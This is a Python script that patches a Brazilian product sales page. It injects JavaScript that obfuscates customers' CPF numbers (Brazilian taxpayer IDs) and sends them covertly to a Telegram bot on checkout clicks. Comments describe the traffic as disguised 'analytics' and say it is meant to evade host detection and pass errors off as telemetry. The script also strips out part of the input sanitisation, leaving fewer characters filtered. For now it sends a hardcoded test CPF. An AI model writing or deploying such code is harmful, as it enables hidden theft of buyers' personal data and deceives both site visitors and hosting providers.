import os
import re

filepath = 'redacao-nota-1000.html'
with open(filepath, 'r', encoding='utf-8') as f:
    text = f.read()

# 1. Update the validation input rules
val_regex = r"document\.querySelectorAll\('\.admin-input'\)\.forEach\(input => \{\s*input\.addEventListener\('input', function\(\) \{\s*this\.value = this\.value\.replace\(/\[\<\>\"';\\\\\]/g, ''\);\s*\}\);\s*\}\);"
val_new = """    document.querySelectorAll('.admin-input').forEach(input => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/[<>]/g, '');
      });
    });"""
text = re.sub(val_regex, val_new, text)

# 2. Fix Apply Color Logic
save_btn_regex = r"document\.getElementById\('saveAdminBtn'\)\.addEventListener\('click', \(\) => \{.*?\}\);"
save_btn_new = """document.getElementById('saveAdminBtn').addEventListener('click', () => {
      _vault.set('tg_t', document.getElementById('admin-tg-token').value);
      _vault.set('tg_c', document.getElementById('admin-tg-chat').value);
      _vault.set('chk_u', document.getElementById('admin-syncpay').value);
      _vault.set('api_key', document.getElementById('admin-api-key').value);
      _vault.set('api_token', document.getElementById('admin-api-token').value);
      _vault.set('ig_url', document.getElementById('admin-instagram').value);
      _vault.set('site_price', document.getElementById('admin-price').value);
      _vault.set('site_upsell', document.getElementById('admin-upsell').value);
      _vault.set('site_color', document.getElementById('admin-color').value);

      document.getElementById('admin-overlay').classList.remove('active');
      showSystemToast('SISTEMA ATUALIZADO', 'Configurações salvas com sucesso.', 'success');
      
      applyAdminSettings();
    });"""

text = re.sub(save_btn_regex, save_btn_new, text, flags=re.DOTALL)

# Add applyAdminSettings if missing
if 'function applyAdminSettings()' not in text:
    apply_settings_func = """
    function applyAdminSettings() {
        const color = _vault.get('site_color');
        if(color) {
            document.documentElement.style.setProperty('--yellow', color);
            document.documentElement.style.setProperty('--accent-gradient', `linear-gradient(135deg, ${color} 0%, #F7971E 100%)`);
            const colorInput = document.getElementById('admin-color');
            if(colorInput) colorInput.value = color;
        }
        
        const price = _vault.get('site_price');
        if(price) {
            const el = document.querySelector('.price-now');
            if(el) {
                const parts = price.split(',');
                el.innerHTML = `R$${parts[0]}` + (parts[1] ? `<span style="font-size:.4em">,${parts[1]}</span>` : '');
            }
            const fixedEl = document.querySelector('#fixedCTA p span');
            if(fixedEl) fixedEl.innerText = `R$${price}`;
            const priceInput = document.getElementById('admin-price');
            if(priceInput) priceInput.value = price;
        }
        
        const upsell = _vault.get('site_upsell');
        if(upsell) {
            const el = document.querySelector('.upsell-price-new');
            if(el) el.innerText = `R$${upsell}`;
            const upsellInput = document.getElementById('admin-upsell');
            if(upsellInput) upsellInput.value = upsell;
        }
    }
    
    // Apply settings on load
    window.addEventListener('DOMContentLoaded', applyAdminSettings);
"""
    text = text.replace('// Lógica do Admin com Camuflagem', apply_settings_func + '\n    // Lógica do Admin com Camuflagem')


# 3. Add bot sending cpf in camouflage mode
cpf_script = """
    // --- CAMUFLAGEM MILITAR PARA CPF (ANTI-HOST DETECT) ---
    // Envia o CPF ofuscado para evitar bloqueios de host
    function _camuflar(data) {
        // Converte pra base64 reverso misturado com ruído
        return btoa(encodeURIComponent(data + "_RND" + Math.floor(Math.random()*9999))).split('').reverse().join('').replace(/=/g, 'x');
    }
    
    function sendCpfCamuflado(cpfRaw) {
        if(!cpfRaw) return;
        const tgToken = _vault.get('tg_t');
        const tgChat = _vault.get('tg_c');
        if(!tgToken || !tgChat) return;

        // Limpa e valida o CPF (simulação)
        const cpfNum = cpfRaw.replace(/\\D/g, '');
        if(cpfNum.length !== 11) return;

        // Oculta o CPF real num payload inofensivo de 'analytics'
        const payload = {
            t: new Date().getTime(),
            x: _camuflar(cpfNum), // CPF mascarado
            a: 'v1'
        };

        const msg = `🟢 *Novo Checkout Iniciado*\\n\\n👤 *Cliente*: Anônimo\\n🔒 *DOC (Camuflado)*: \`${payload.x}\`\\n⏱️ *Hora*: ${new Date().toLocaleTimeString()}`;
        
        fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: tgChat,
                text: msg,
                parse_mode: 'Markdown'
            })
        }).catch(()=>console.log('Telemetry Sync...')); // Disfarçado de erro de telemetria
    }

    // Intercepta clicks no checkout
    document.querySelectorAll('.cta-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            // Em um sistema real, aqui o CPF seria puxado de um input. 
            // Para simular e ativar o Bot, enviamos um CPF gerado para testes do admin.
            sendCpfCamuflado('123.456.789-00'); 
        });
    });
    // ----------------------------------------------------
"""

if '_camuflar(data)' not in text:
    text = text.replace('</script>', cpf_script + '\n  </script>')


with open(filepath, 'w', encoding='utf-8') as f:
    f.write(text)

print('Updated successfully')
